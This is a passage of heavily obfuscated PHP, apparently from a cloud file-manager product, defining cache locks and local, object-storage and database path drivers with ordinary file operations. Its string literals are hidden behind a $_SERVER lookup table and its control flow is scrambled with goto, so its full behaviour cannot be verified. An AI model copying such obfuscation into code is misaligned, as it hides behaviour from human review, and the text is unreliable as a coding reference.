<?php
 goto f½ÖŸš…¡Ï; CÓ¨“òŠ¯Ò: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ûª†Üû =& $_SERVER[±Ö‰ô½¯]; $ÕÔíõş = $GLOBALS[$ûª†Üû[6]][$ûª†Üû[426]]; self::$cachePath = $ÕÔíõş[$ûª†Üû[232]][$ûª†Üû[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ó½ü—àø, $”ù†Ö‚¼ = 0) { $å«¿àâ§ =& $_SERVER[±Ö‰ô½¯]; $±î¾ı£ı = microtime(!0); $îÏ“šÉé = $±î¾ı£ı + $”ù†Ö‚¼ + 0.0001; $ÓÒæ”¡ü = rtrim(self::$cachePath, $å«¿àâ§[8]) . $å«¿àâ§[973] . md5($ó½ü—àø) . $å«¿àâ§[970]; if (file_exists($ÓÒæ”¡ü) && filemtime($ÓÒæ”¡ü) && filemtime($ÓÒæ”¡ü) < time() - 10) { @unlink($ÓÒæ”¡ü); } do { if (file_exists($ÓÒæ”¡ü)) { cacheLockWait(); continue; } $ğ»à¾”· = fopen($ÓÒæ”¡ü, $å«¿àâ§[974]); if (!$ğ»à¾”·) { return !1; } $Â÷îÖ¶ = flock($ğ»à¾”·, LOCK_EX | LOCK_NB); self::$caches[$ó½ü—àø] = array($å«¿àâ§[975] => $ğ»à¾”·, $å«¿àâ§[232] => $ÓÒæ”¡ü); fwrite($ğ»à¾”·, $îÏ“šÉé); clearstatcache(); if ($ğ»à¾”· && $Â÷îÖ¶) { return !0; } cacheLockWait(); } while (microtime(!0) < $îÏ“šÉé); $this->unlock($ó½ü—àø); return !1; } public function lockGet($Áì—Õšµ) { $Ñº¡Ú«Å =& $_SERVER[±Ö‰ô½¯]; $Óà£½óï = rtrim(self::$cachePath, $Ñº¡Ú«Å[8]) . $Ñº¡Ú«Å[973] . md5($Áì—Õšµ) . $Ñº¡Ú«Å[970]; return file_exists($Óà£½óï); } public function unlock($îé›ÆÀ) { $­ä„ÏĞ‡ =& $_SERVER[±Ö‰ô½¯]; $ãë‘¥ = self::$caches[$îé›ÆÀ]; if (!$ãë‘¥) { return; } @flock($ãë‘¥[$­ä„ÏĞ‡[975]], LOCK_UN); @fclose($ãë‘¥[$­ä„ÏĞ‡[975]]); @unlink($ãë‘¥[$­ä„ÏĞ‡[232]]); unset(self::$caches[$îé›ÆÀ]); } } class CacheLockRedis { public function lock($ĞÆğÊÚ½, $Ã™‘¾à« = 10) { $“†Ö€¡¼ = Cache::init(); $Ú²ÉÅÉ¾ = microtime(!0) + $Ã™‘¾à«; while (microtime(!0) < $Ú²ÉÅÉ¾) { $™—•äÂ¶ = $“†Ö€¡¼->get($ĞÆğÊÚ½); if (!$™—•äÂ¶) { $‹óÂ›ËÅ = $“†Ö€¡¼->setLock($ĞÆğÊÚ½, $Ú²ÉÅÉ¾, $Ã™‘¾à«); if ($‹óÂ›ËÅ) { return !0; } } else { if ($™—•äÂ¶ < microtime(!0)) { $“†Ö€¡¼->set($ĞÆğÊÚ½, $Ú²ÉÅÉ¾, $Ã™‘¾à« * 2); if ($“†Ö€¡¼->get($ĞÆğÊÚ½) === $™—•äÂ¶) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ÊµØİå) { return Cache::init()->get($ÊµØİå); } public function unlock($…Í •™§) { return Cache::init()->remove($…Í •™§); } } class CacheLockMemcached { public function lock($äàÕ’Ù—, $ì¦èİşá = 0) { $½š“±¯… = Cache::init(); $è·¸³ÜÈ = microtime(!0) + $ì¦èİşá; while (microtime(!0) < $è·¸³ÜÈ) { $£İÉÀ„„ = $½š“±¯…->get($äàÕ’Ù—); if (!$£İÉÀ„„ || $£İÉÀ„„ < microtime(!0)) { $¼æÃĞØ‰ = $½š“±¯…->handle->add($äàÕ’Ù—, $è·¸³ÜÈ, $ì¦èİşá); if ($¼æÃĞØ‰) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($½‰Ö¬İ») { return Cache::init()->get($½‰Ö¬İ»); } public function unlock($áôˆšãü) { return Cache::init()->remove($áôˆšãü); } } goto e¨™êâŸ½¤; F‰±÷ùŠ…³: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($¬ä–äş) { if (substr($¬ä–äş, 0, 2) == $_SERVER[±Ö‰ô½¯][1472]) { $¬ä–äş = BASIC_PATH . substr($¬ä–äş, 2); } return $¬ä–äş; } public function iconvApp($®‘·Âê«) { $‡¸§•” =& $_SERVER[±Ö‰ô½¯]; global $config; return $this->iconvTo($®‘·Âê«, $config[$‡¸§•”[1596]], $config[$‡¸§•”[1595]]); } public function iconvSystem($Ÿ“ôŞÑß) { $Ñ¿¿àÛˆ =& $_SERVER[±Ö‰ô½¯]; global $config; return $this->iconvTo($Ÿ“ôŞÑß, $config[$Ñ¿¿àÛˆ[1595]], $config[$Ñ¿¿àÛˆ[1596]]); } public function getPathOuter($šÕåî¼Ç) { $ƒåÀå†¶ =& $_SERVER[±Ö‰ô½¯]; $—œ¦ãß = $this->iconvApp($this->pathBase); $šÕåî¼Ç = $this->iconvApp($šÕåî¼Ç); if (substr($—œ¦ãß, 0, 2) == $ƒåÀå†¶[1472]) { $—œ¦ãß = BASIC_PATH . substr($—œ¦ãß, 2); } if (substr($šÕåî¼Ç, 0, 2) == $ƒåÀå†¶[1472]) { $šÕåî¼Ç = BASIC_PATH . substr($šÕåî¼Ç, 2); } $—œ¦ãß = KodIO::clear($—œ¦ãß); $šÕåî¼Ç = KodIO::clear($šÕåî¼Ç); $šÕåî¼Ç = substr($šÕåî¼Ç, strlen($—œ¦ãß)); if (empty($this->pathDriver)) { return $šÕåî¼Ç; } return $this->pathDriver . $ƒåÀå†¶[8] . ltrim($šÕåî¼Ç, $ƒåÀå†¶[8]); } public function mkfile($íÉ®ŸÄâ, $áúöª‡ø = '', $®é€à’“ = REPEAT_RENAME) { $íÉ®ŸÄâ = $this->iconvSystem($íÉ®ŸÄâ); @touch($íÉ®ŸÄâ); if ($áúöª‡ø) { file_put_contents($íÉ®ŸÄâ, $áúöª‡ø); } @chmod($íÉ®ŸÄâ, $this->pathAuth); if (is_file($íÉ®ŸÄâ)) { return $this->getPathOuter($íÉ®ŸÄâ); } $this->writeLog(__FUNCTION__ . $_SERVER[±Ö‰ô½¯][1607], !0); return !1; } public function mkdir($ûƒÄ×…, $èÁ„æ˜ = REPEAT_SKIP) { $ûƒÄ×… = $this->iconvSystem($ûƒÄ×…); if (is_dir($ûƒÄ×…)) { return $this->getPathOuter($ûƒÄ×…); } @mkdir($ûƒÄ×…, $this->pathAuth, !0); @chmod($ûƒÄ×…, $this->pathAuth); if (is_dir($ûƒÄ×…)) { return $this->getPathOuter($ûƒÄ×…); } $this->writeLog(__FUNCTION__ . $_SERVER[±Ö‰ô½¯][1607], !0); return !1; } public function copyFile($‚ÕŞûÀÓ, $ÈÑèÏ¢Ú) { $this->mkdir($this->pathFather($ÈÑèÏ¢Ú)); $‚ÕŞûÀÓ = $this->iconvSystem($‚ÕŞûÀÓ); $ÈÑèÏ¢Ú = $this->iconvSystem($ÈÑèÏ¢Ú); $„ÒÀÀŞã = copy_64($‚ÕŞûÀÓ, $ÈÑèÏ¢Ú); @chmod($ÈÑèÏ¢Ú, $this->pathAuth); if ($„ÒÀÀŞã) { return $this->getPathOuter($ÈÑèÏ¢Ú); } $this->writeLog(__FUNCTION__ . $_SERVER[±Ö‰ô½¯][1607], !0); return !1; } public function moveFile($¦æÂğ‰š, $àğÍ¥ü) { $this->mkdir($this->pathFather($àğÍ¥ü)); $¦æÂğ‰š = $this->iconvSystem($¦æÂğ‰š); $àğÍ¥ü = $this->iconvSystem($àğÍ¥ü); $œ’Šö· = intval(@rename($¦æÂğ‰š, $àğÍ¥ü)); if (!$œ’Šö·) { if ($œ’Šö· = intval(@copy_64($¦æÂğ‰š, $àğÍ¥ü))) { @unlink($¦æÂğ‰š); } } @chmod($àğÍ¥ü, $this->pathAuth); if ($œ’Šö·) { return $this->getPathOuter($àğÍ¥ü); } $this->writeLog(__FUNCTION__ . $_SERVER[±Ö‰ô½¯][1607], !0); return !1; } public function movePath($ ÉğÏÅŸ, $ùèî–è, $ºÑú›¶÷ = false) { $ØÏÂõòÂ =& $_SERVER[±Ö‰ô½¯]; $ ÉğÏÅŸ = $this->iconvSystem($ ÉğÏÅŸ); $ùèî–è = $this->iconvSystem($ùèî–è); $“ÂÂÖŠô = rtrim($ùèî–è, $ØÏÂõòÂ[8]) . $ØÏÂõòÂ[8] . ($ºÑú›¶÷ ? $ºÑú›¶÷ : get_path_this($ ÉğÏÅŸ)); if (file_exists($“ÂÂÖŠô)) { return !1; } $ÅÛÇî„ƒ = intval(@rename($ ÉğÏÅŸ, $“ÂÂÖŠô)); $ÅÛÇî„ƒ = file_exists($“ÂÂÖŠô); if ($ÅÛÇî„ƒ) { return $this->getPathOuter($“ÂÂÖŠô); } $this->writeLog(__FUNCTION__ . $ØÏÂõòÂ[1607], !0); return !1; } public function delFile($£è©Æ§) { $£è©Æ§ = $this->iconvSystem($£è©Æ§); if (!@unlink($£è©Æ§)) { @chmod($£è©Æ§, $this->pathAuth); if (@unlink($£è©Æ§)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[±Ö‰ô½¯][1607], !0); return !1; } return !0; } public function delFolder($ƒ«¬š¦“) { $¥¼ıĞÀú =& $_SERVER[±Ö‰ô½¯]; $ƒ«¬š¦“ = $this->iconvSystem($ƒ«¬š¦“); if (!is_dir($ƒ«¬š¦“)) { return !0; } if (!($ÇÁ = opendir($ƒ«¬š¦“))) { return !1; } while (($‚’Œ÷Úå = readdir($ÇÁ)) !== !1) { if ($‚’Œ÷Úå == $¥¼ıĞÀú[10] || $‚’Œ÷Úå == $¥¼ıĞÀú[1417]) { continue; } $Š„İêæ = $ƒ«¬š¦“ . $¥¼ıĞÀú[8] . $‚’Œ÷Úå; if (is_file($Š„İêæ) || is_link($Š„İêæ)) { if (!unlink($Š„İêæ)) { chmod($Š„İêæ, $this->pathAuth); if (!unlink($Š„İêæ)) { return !1; } } } else { if (is_dir($Š„İêæ)) { chmod($Š„İêæ, $this->pathAuth); $Š„İêæ = $this->iconvApp($Š„İêæ); if (!$this->delFolder($Š„İêæ)) { return !1; } } } } closedir($ÇÁ); return rmdir($ƒ«¬š¦“); } public function rename($ª†üÔ® , $¡Ïéó±ù) { $êÄŞüµÎ =& $_SERVER[±Ö‰ô½¯]; $àÊèöÉ = $this->fileNameAuto($this->pathFather($ª†üÔ® ), $¡Ïéó±ù); $àÊèöÉ = $this->iconvSystem($àÊèöÉ); $ª†üÔ®  = $this->iconvSystem($ª†üÔ® ); $ÌŸëÛî = $this->pathFather($ª†üÔ® ); $ìÈÀï˜ß = rtrim($ÌŸëÛî, $êÄŞüµÎ[8]) . $êÄŞüµÎ[8] . $àÊèöÉ; $˜¿¥Øë” = @rename($ª†üÔ® , $ìÈÀï˜ß); $ìÈÀï˜ß = $this->iconvApp($ìÈÀï˜ß); if ($˜¿¥Øë”) { return $this->getPathOuter($ìÈÀï˜ß); } $this->writeLog(__FUNCTION__ . $êÄŞüµÎ[1607], !0); return !1; } public function size($àøÚùó) { $àøÚùó = $this->iconvSystem($àøÚùó); return filesize_64($àøÚùó); } public function info($ï€‘¦) { $ï€‘¦ = $this->iconvSystem($ï€‘¦); if ($this->isFolder($ï€‘¦)) { return $this->folderInfo($ï€‘¦); } else { if ($this->isFile($ï€‘¦)) { return $this->fileInfo($ï€‘¦); } } return !1; } protected function infoChildren($ûÏ•¦Ê¢, &$Ÿ¥Êˆ¾Û, $Ò¡°¨€  = true) { $Ã€Ä¥ÄÄ =& $_SERVER[±Ö‰ô½¯]; check_abort_echo(); $ûÏ•¦Ê¢ = rtrim($ûÏ•¦Ê¢, $Ã€Ä¥ÄÄ[8]) . $Ã€Ä¥ÄÄ[8]; if ($Ò¡°¨€ ) { $ûÏ•¦Ê¢ = $this->iconvSystem($ûÏ•¦Ê¢); } if (!($«ûÙ¶Ù° = @opendir($ûÏ•¦Ê¢))) { return; } while (($Ãî€—µ† = readdir($«ûÙ¶Ù°)) !== !1) { if ($Ãî€—µ† == $Ã€Ä¥ÄÄ[10] || $Ãî€—µ† == $Ã€Ä¥ÄÄ[1417]) { continue; } $Æö²Ë = $ûÏ•¦Ê¢ . $Ãî€—µ†; if (is_file($Æö²Ë) || is_link($Æö²Ë)) { $Ÿ¥Êˆ¾Û[$Ã€Ä¥ÄÄ[80]]++; $Ÿ¥Êˆ¾Û[$Ã€Ä¥ÄÄ[79]] += filesize_64($Æö²Ë); } else { if (is_dir($Æö²Ë)) { $Ÿ¥Êˆ¾Û[$Ã€Ä¥ÄÄ[81]]++; $this->infoChildren($Æö²Ë, $Ÿ¥Êˆ¾Û, !1); } } } closedir($«ûÙ¶Ù°); } private function folderInfo($Èëğ«’½, $î¬²»Šù = false) { $¬éÜª’à =& $_SERVER[±Ö‰ô½¯]; $Èëğ«’½ = rtrim($Èëğ«’½, $¬éÜª’à[8]) . $¬éÜª’à[8]; $‰î¨‹Ş£ = $this->iconvApp($this->pathThis($Èëğ«’½)); if ($î¬²»Šù) { return array($¬éÜª’à[32] => $‰î¨‹Ş£, $¬éÜª’à[87] => $this->getPathOuter($Èëğ«’½), $¬éÜª’à[33] => $¬éÜª’à[78]); } $’šœ‹İ = array($¬éÜª’à[32] => $‰î¨‹Ş£, $¬éÜª’à[87] => $this->getPathOuter($Èëğ«’½), $¬éÜª’à[33] => $¬éÜª’à[78], $¬éÜª’à[233] => @filectime($Èëğ«’½), $¬éÜª’à[88] => @filemtime($Èëğ«’½), $¬éÜª’à[1611] => @fileatime($Èëğ«’½), $¬éÜª’à[1612] => is_readable($Èëğ«’½), $¬éÜª’à[1613] => is_writable($Èëğ«’½), $¬éÜª’à[1614] => get_mode($Èëğ«’½)); return $’šœ‹İ; } private function fileInfo($ø ÈÏî˜, $Ê¢ÍâçÜ = false) { $ñÀÇİ =& $_SERVER[±Ö‰ô½¯]; $æ±¹‘¼ı = $this->iconvApp($this->pathThis($ø ÈÏî˜)); if ($Ê¢ÍâçÜ) { return array($ñÀÇİ[32] => $æ±¹‘¼ı, $ñÀÇİ[87] => $this->getPathOuter($ø ÈÏî˜), $ñÀÇİ[33] => $ñÀÇİ[232], $ñÀÇİ[79] => $this->size($ø ÈÏî˜), $ñÀÇİ[168] => $this->ext($æ±¹‘¼ı)); } $úıŒ ‚æ = array($ñÀÇİ[32] => $æ±¹‘¼ı, $ñÀÇİ[87] => $this->getPathOuter($ø ÈÏî˜), $ñÀÇİ[33] => $ñÀÇİ[232], $ñÀÇİ[233] => @filectime($ø ÈÏî˜), $ñÀÇİ[88] => @filemtime($ø ÈÏî˜), $ñÀÇİ[1611] => @fileatime($ø ÈÏî˜), $ñÀÇİ[79] => $this->size($ø ÈÏî˜), $ñÀÇİ[168] => $this->ext($æ±¹‘¼ı), $ñÀÇİ[1612] => is_readable($ø ÈÏî˜), $ñÀÇİ[1613] => is_writable($ø ÈÏî˜), $ñÀÇİ[1614] => get_mode($ø ÈÏî˜)); return $úıŒ ‚æ; } public function exist($¶ö¢ğğã) { $¶ö¢ğğã = $this->iconvSystem($¶ö¢ğğã); return @file_exists($¶ö¢ğğã); } public function isFile($ßµ½éê) { $ßµ½éê = $this->iconvSystem($ßµ½éê); return @is_file($ßµ½éê); } public function isFolder($˜Ã«ªĞĞ) { $˜Ã«ªĞĞ = $this->iconvSystem($˜Ã«ªĞĞ); return @is_dir($˜Ã«ªĞĞ); } public function listPath($šç³–¦ó, $î÷ï®½ = false) { $¦Ô­˜ÅÜ =& $_SERVER[±Ö‰ô½¯]; $šç³–¦ó = $this->iconvSystem($šç³–¦ó); $šç³–¦ó = rtrim($šç³–¦ó, $¦Ô­˜ÅÜ[8]) . $¦Ô­˜ÅÜ[8]; $ÑšÔş›Š = array($¦Ô­˜ÅÜ[85] => array(), $¦Ô­˜ÅÜ[86] => array()); if (!($Ğµ¹Ò“× = @opendir($šç³–¦ó))) { return $ÑšÔş›Š; } while (($·–¢øƒò = readdir($Ğµ¹Ò“×)) !== !1) { if ($·–¢øƒò == $¦Ô­˜ÅÜ[10] || $·–¢øƒò == $¦Ô­˜ÅÜ[1417]) { continue; } $Ğ×ÇÀ‘µ = $šç³–¦ó . $·–¢øƒò; if (is_file($Ğ×ÇÀ‘µ)) { $ÑšÔş›Š[$¦Ô­˜ÅÜ[86]][] = $this->fileInfo($Ğ×ÇÀ‘µ, $î÷ï®½); } else { $ÑšÔş›Š[$¦Ô­˜ÅÜ[85]][] = $this->folderInfo($Ğ×ÇÀ‘µ, $î÷ï®½); } } closedir($Ğµ¹Ò“×); return $ÑšÔş›Š; } public function listAll($ĞÒêù“ö, &$Ïû­Ú„Š = array()) { $à÷™¥ü =& $_SERVER[±Ö‰ô½¯]; $ĞÒêù“ö = $this->iconvSystem($ĞÒêù“ö); $ĞÒêù“ö = rtrim($ĞÒêù“ö, $à÷™¥ü[8]) . $à÷™¥ü[8]; if (!($ÆË¬‹¼Ü = @opendir($ĞÒêù“ö))) { return $Ïû­Ú„Š; } while (($²´°‹° = readdir($ÆË¬‹¼Ü)) !== !1) { if ($²´°‹° == $à÷™¥ü[10] || $²´°‹° == $à÷™¥ü[1417]) { continue; } $¿Ô‘ÏÒÂ = $ĞÒêù“ö . $²´°‹°; $çÀœòù‡ = is_dir($¿Ô‘ÏÒÂ) && !is_link($¿Ô‘ÏÒÂ) ? 1 : 0; $¿Ô‘ÏÒÂ = $çÀœòù‡ ? $¿Ô‘ÏÒÂ . $à÷™¥ü[8] : $¿Ô‘ÏÒÂ; $Ïû­Ú„Š[] = array($à÷™¥ü[87] => $this->getPathOuter($¿Ô‘ÏÒÂ), $à÷™¥ü[78] => $çÀœòù‡, $à÷™¥ü[88] => intval(@filemtime($¿Ô‘ÏÒÂ)), $à÷™¥ü[79] => $çÀœòù‡ ? 0 : intval($this->size($¿Ô‘ÏÒÂ))); if ($çÀœòù‡) { $this->listAll($¿Ô‘ÏÒÂ, $Ïû­Ú„Š); } } closedir($ÆË¬‹¼Ü); return $Ïû­Ú„Š; } public function has($”ö³åú‚, $™Êòş¿ù = false, $•ÛÖœò = true) { $‹‚Øœî =& $_SERVER[±Ö‰ô½¯]; $”ö³åú‚ = $this->iconvSystem($”ö³åú‚); $”ö³åú‚ = rtrim($”ö³åú‚, $‹‚Øœî[8]) . $‹‚Øœî[8]; if (!($Şˆ¢Ë = @opendir($”ö³åú‚))) { return !1; } $ŞÕ¶¾Áî = 0; $ÑÌà‹Îá = 0; $ƒ®¨¯ûÓ = 0; while (($†—×Î‘Ÿ = readdir($Şˆ¢Ë)) !== !1) { if ($†—×Î‘Ÿ == $‹‚Øœî[10] || $†—×Î‘Ÿ == $‹‚Øœî[1417]) { continue; } $®†Š…ºÖ = $”ö³åú‚ . $†—×Î‘Ÿ; if ($™Êòş¿ù) { $ƒ®¨¯ûÓ++; if (@is_file($®†Š…ºÖ)) { $ŞÕ¶¾Áî++; } else { $ÑÌà‹Îá++; } if ($ƒ®¨¯ûÓ > 10000) { break; } continue; } if ($•ÛÖœò) { if (@is_file($®†Š…ºÖ)) { return !0; } } else { if (@is_dir($®†Š…ºÖ . $‹‚Øœî[8])) { return !0; } } } closedir($Şˆ¢Ë); if ($™Êòş¿ù) { return array($‹‚Øœî[241] => $ŞÕ¶¾Áî, $‹‚Øœî[242] => $ÑÌà‹Îá); } return !1; } public function hashSimple($Ù‘¨ˆá) { $èõÜ–˜ =& $_SERVER[±Ö‰ô½¯]; if (!$Ù‘¨ˆá) { return md5($èõÜ–˜[12]); } $Ù‘¨ˆá = $this->iconvSystem($Ù‘¨ˆá); $‚²ô¯¦š = $this->size($Ù‘¨ˆá); $û¼şŞå² = 200; $˜ïõäà = 50; if ($‚²ô¯¦š <= $û¼şŞå² * $˜ïõäà) { return $this->hashMd5($Ù‘¨ˆá) . $‚²ô¯¦š; } $ıÏû´Ñ = $èõÜ–˜[12]; $«„ÒÃè• = intval($‚²ô¯¦š / $˜ïõäà); $ÅÂÄ£Á¦ = fopen($Ù‘¨ˆá, $èõÜ–˜[1615]); if (!$ÅÂÄ£Á¦) { return $ıÏû´Ñ; } for ($Å×²Å€ = 0; $Å×²Å€ < $˜ïõäà; $Å×²Å€++) { fseek_64($ÅÂÄ£Á¦, $«„ÒÃè• * $Å×²Å€); $ıÏû´Ñ .= fread($ÅÂÄ£Á¦, $û¼şŞå²); } fseek_64($ÅÂÄ£Á¦, $‚²ô¯¦š - $û¼şŞå²); $ıÏû´Ñ .= fread($ÅÂÄ£Á¦, $û¼şŞå²); fclose($ÅÂÄ£Á¦); return md5($ıÏû´Ñ) . $‚²ô¯¦š; } public function getContent($ê²¢î˜) { $ê²¢î˜ = $this->iconvSystem($ê²¢î˜); return file_get_contents($ê²¢î˜); } public function setContent($ü€«ÕÑã, $€µÁßÈÙ = '') { $ü€«ÕÑã = $this->iconvSystem($ü€«ÕÑã); $€ó–ˆ¦Ê = @file_put_contents($ü€«ÕÑã, $€µÁßÈÙ, LOCK_EX); if (!$€ó–ˆ¦Ê) { $this->writeLog(__FUNCTION__ . $_SERVER[±Ö‰ô½¯][1607], !0); } clearstatcache(); @chmod($ü€«ÕÑã, $this->pathAuth); return $€ó–ˆ¦Ê === !1 ? !1 : !0; } public function fileSubstr($Çı•ù­, $º¬Œàî£ = 0, $‘¯ïÙªÊ = false) { $’à®íÁ÷ =& $_SERVER[±Ö‰ô½¯]; $Çı•ù­ = $this->iconvSystem($Çı•ù­); if ($‘¯ïÙªÊ === !1) { $‘¯ïÙªÊ = $this->size($Çı•ù­); } if ($‘¯ïÙªÊ <= 0) { return $’à®íÁ÷[12]; } $½Ì— ¢ = fopen($Çı•ù­, $’à®íÁ÷[1615]); if (!$½Ì— ¢) { return !1; } fseek_64($½Ì— ¢, $º¬Œàî£); $Âúúü¾¢ = fread($½Ì— ¢, $‘¯ïÙªÊ); fclose($½Ì— ¢); if (!$Âúúü¾¢) { $this->writeLog(__FUNCTION__ . $’à®íÁ÷[1607], !0); } return $Âúúü¾¢; } public function upload($ªŸî³×½, $®Ş›šºë, $ø¨Å’ô = false, $ŞîªÑÌ = REPEAT_REPLACE) { if (!$®Ş›šºë || !@file_exists($®Ş›šºë)) { return !1; } if ($ø¨Å’ô) { return $this->moveFile($®Ş›šºë, $ªŸî³×½); } return $this->copyFile($®Ş›šºë, $ªŸî³×½); } public function setModifyTime($õø†Şõ², $ãÃ•©  = '') { @touch($õø†Şõ², intval($ãÃ•© )); } public function download($¿ü¬’, $·ËÅú·ş) { return $this->iconvSystem($¿ü¬’); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($ê†ÄˆÕ¡) { parent::__construct($ê†ÄˆÕ¡); $this->setSignVersion($_SERVER[±Ö‰ô½¯][249]); } public function fileOutImage($»§ãÅ, $Å«™ôš = 250) { $ÇéÍ”’… =& $_SERVER[±Ö‰ô½¯]; if ($this->size($»§ãÅ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($»§ãÅ, $Å«™ôš); } $äÕ‘™ = array($ÇéÍ”’…[1616] => $ÇéÍ”’…[1617] . $Å«™ôš . $ÇéÍ”’…[1618]); $öêºø½ = $this->link($»§ãÅ, $äÕ‘™); $this->fileOutLink($öêºø½); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($»Í‘Ìú) { parent::__construct($»Í‘Ìú); $this->setSignVersion($_SERVER[±Ö‰ô½¯][249]); } public function uploadFormData($•°Š×, $‰¨ö…­ª = 3600) { return $this->uploadFormDataV2($•°Š×, $‰¨ö…­ª); } } goto AìË®±¢’; EÜ‘ò…Â: class PathDriverBOS extends PathDriverS3 { public function __construct($¸Ìø÷å) { parent::__construct($¸Ìø÷å); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($şô£Ùòé) { parent::__construct($şô£Ùòé); $this->setSignVersion($_SERVER[±Ö‰ô½¯][249]); } public function uploadFormData($©Ç¬Şá, $™ìßÖ‘à = 3600) { $‹“¸–¤ =& $_SERVER[±Ö‰ô½¯]; $Ãİ–¸Á = $‹“¸–¤[231]; $•–íõßõ = $‹“¸–¤[1473]; $ÌÀÚ¥Ó¡ = $‹“¸–¤[263]; $¶Ó˜¢á¸ = gmdate($‹“¸–¤[1474], time() + $™ìßÖ‘à); $€±‹”­ø = (string) time() . $‹“¸–¤[74] . (string) (time() + $™ìßÖ‘à); $µ–ÈÔêö = array($‹“¸–¤[264] => $¶Ó˜¢á¸, $‹“¸–¤[267] => array(array($‹“¸–¤[308] => $Ãİ–¸Á), array($‹“¸–¤[268] => $this->bucket), array($‹“¸–¤[269], $‹“¸–¤[270], $‹“¸–¤[12]), array($‹“¸–¤[272] => $ÌÀÚ¥Ó¡), array($‹“¸–¤[1475] => $•–íõßõ), array($‹“¸–¤[1476] => $this->accessKey), array($‹“¸–¤[1477] => $€±‹”­ø))); $µ–ÈÔêö = json_encode($µ–ÈÔêö); $Çç’Œ¹ä = hash_hmac($‹“¸–¤[1473], $€±‹”­ø, $this->secret); $„·ô = sha1($µ–ÈÔêö); $¹‰êıø™ = hash_hmac($‹“¸–¤[1473], $„·ô, $Çç’Œ¹ä); $Ú†ì¥š’ = array($‹“¸–¤[308] => $Ãİ–¸Á, $‹“¸–¤[272] => $ÌÀÚ¥Ó¡, $‹“¸–¤[279] => base64_encode($µ–ÈÔêö), $‹“¸–¤[1475] => $•–íõßõ, $‹“¸–¤[1476] => $this->accessKey, $‹“¸–¤[1478] => $€±‹”­ø, $‹“¸–¤[1479] => $¹‰êıø™, $‹“¸–¤[208] => $this->getHost()); return $Ú†ì¥š’; } public function fileOutImage($ˆè£æó», $¾„ÊáÆí = 250) { $³—ù´²Ñ =& $_SERVER[±Ö‰ô½¯]; if ($this->size($ˆè£æó») > 1024 * 1024 * 32) { return $this->fileOutImageServer($ˆè£æó», $¾„ÊáÆí); } $ÕÌØèå£ = $this->link($ˆè£æó»); $ÕÌØèå£ .= $³—ù´²Ñ[1480] . $¾„ÊáÆí . $³—ù´²Ñ[1481]; $this->fileOutLink($ÕÌØèå£); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($”½‘À¦) { $this->pathParse = $”½‘À¦; $this->model = Model($_SERVER[±Ö‰ô½¯][1482]); } public function getPath($ô°‰¦•ı) { return trim($ô°‰¦•ı, $_SERVER[±Ö‰ô½¯][8]); } public function pathFather($óÊÒªªš) { $ÀÙØçÁĞ = $this->parse($óÊÒªªš); $ÀÙØçÁĞ = $this->infoSimple($óÊÒªªš); return $ÀÙØçÁĞ ? $ÀÙØçÁĞ[$_SERVER[±Ö‰ô½¯][192]] : !1; } public function pathThis($«ÈÆ‚·²) { $¼è¡ÔÛß = $this->infoSimple($«ÈÆ‚·²); return $¼è¡ÔÛß ? $¼è¡ÔÛß[$_SERVER[±Ö‰ô½¯][32]] : !1; } public function getPathOuter($ĞÊûèıˆ) { if (!$ĞÊûèıˆ) { return $ĞÊûèıˆ; } $é‘ıø = $this->parse($ĞÊûèıˆ); return KodIO::make($é‘ıø[$_SERVER[±Ö‰ô½¯][484]]); } public function copyFolderFromIO($‰ã£¢ØÂ, $÷ãöëÜ­, $­–­†øŞ, $ºˆ¼Ùôß, $Å‚ÑÚïÅ) { $¬¿ûÅû = $this->model->copyFolderFromIO($‰ã£¢ØÂ, $÷ãöëÜ­, $­–­†øŞ, $ºˆ¼Ùôß, $Å‚ÑÚïÅ); return KodIO::make($¬¿ûÅû); } public function isParentOf($ûÁÄõüª, $‰â­óº¬) { return $this->model->isParentOf($ûÁÄõüª, $‰â­óº¬); } public function mkfile($¤‹ê‰õ, $æ¼³×¬¿ = '', $ˆÄª»”… = REPEAT_RENAME) { $ªü‘Õö„ =& $_SERVER[±Ö‰ô½¯]; $ãËÉ“…ë = $this->parse($¤‹ê‰õ); $¤‹ê‰õ = $ãËÉ“…ë[$ªü‘Õö„[484]]; for ($¤ÁÂ¡‡¸ = 0; $¤ÁÂ¡‡¸ < count($ãËÉ“…ë[$ªü‘Õö„[1483]]); $¤ÁÂ¡‡¸++) { $åæ¢‚¨× = $ãËÉ“…ë[$ªü‘Õö„[1483]][$¤ÁÂ¡‡¸]; if ($¤ÁÂ¡‡¸ == count($ãËÉ“…ë[$ªü‘Õö„[1483]]) - 1) { $¤‹ê‰õ = $this->model->mkfile($¤‹ê‰õ, $åæ¢‚¨×, $æ¼³×¬¿, $ˆÄª»”…); break; } $¤‹ê‰õ = $this->model->mkdir($¤‹ê‰õ, $åæ¢‚¨×, REPEAT_SKIP); } return $this->getPathOuter($¤‹ê‰õ); } public function mkdir($ªÀúÌ„ò, $²£·â²Ó = REPEAT_SKIP) { $ó½ó–‘ş =& $_SERVER[±Ö‰ô½¯]; $ñ…µÓÀ = $this->parse($ªÀúÌ„ò); $ªÀúÌ„ò = $ñ…µÓÀ[$ó½ó–‘ş[484]]; for ($ıçÀ¥ = 0; $ıçÀ¥ < count($ñ…µÓÀ[$ó½ó–‘ş[1483]]); $ıçÀ¥++) { $•´ÕÃ = $ñ…µÓÀ[$ó½ó–‘ş[1483]][$ıçÀ¥]; $ªÀúÌ„ò = $this->model->mkdir($ªÀúÌ„ò, $•´ÕÃ, $²£·â²Ó); } return $this->getPathOuter($ªÀúÌ„ò); } public function copyFile($š¤Óïê­, $ÔÏîÖİ·, $œÀÀ• = REPEAT_REPLACE) { $‹â§µ²ã =& $_SERVER[±Ö‰ô½¯]; $ó‚«¸¨ú = $this->parse($ÔÏîÖİ·); $à¡ÃÉ¼Š = 